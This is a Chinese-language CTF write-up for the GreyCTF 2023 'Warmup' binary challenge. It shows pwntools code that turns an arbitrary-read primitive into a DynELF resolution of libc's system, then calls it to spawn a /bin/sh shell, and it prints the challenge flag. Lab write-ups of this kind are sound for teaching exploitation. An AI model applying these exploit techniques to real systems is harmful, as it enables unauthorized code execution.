# GreyCTF 2023 Warmup

## 题目简述

程序启动时泄露一个全局变量地址，菜单随后提供任意 8 字节读和任意函数地址调用；调用时第一个参数已经固定为 `/bin/sh`。由于 libc 开启 ASLR，剩余任务只是借任意读解析动态链接结构，定位 `system`。

## 解题过程

任意读接口接收十六进制地址并输出该地址处的 64 位整数。把它封装为返回原始 8 字节的小函数：

```python
def leak(addr):
    choose(1)
    send_hex(addr)
    value = parse_hex_reply()
    return p64(value)
```

启动泄露给出了主程序映射中的已知地址，可作为 DynELF 的初始指针。pwntools 会沿 ELF 动态段、link map、哈希表和符号表反复调用 `leak`，最终查到已加载 libc 中的 `system`：

```python
resolver = DynELF(leak, initial_leak)
system = resolver.lookup("system", "libc")
```

选择菜单的任意调用功能并提交 `system` 地址。程序按 `void (*)(char *)` 调用该地址，首参自动为 `/bin/sh`，因此直接进入 shell并读取：

```text
grey{Hope_you've_enjoyed_S1ngapore_s0_far!}
```

## 方法总结

任意读加任意间接调用已经构成完整利用原语，没必要再寻找栈溢出。DynELF 的价值在于不知道远端 libc 版本时，通过目标进程内存自行解析符号；若随题提供完全匹配的 libc，也可先泄露一个 GOT 函数并用固定偏移计算 `system`。
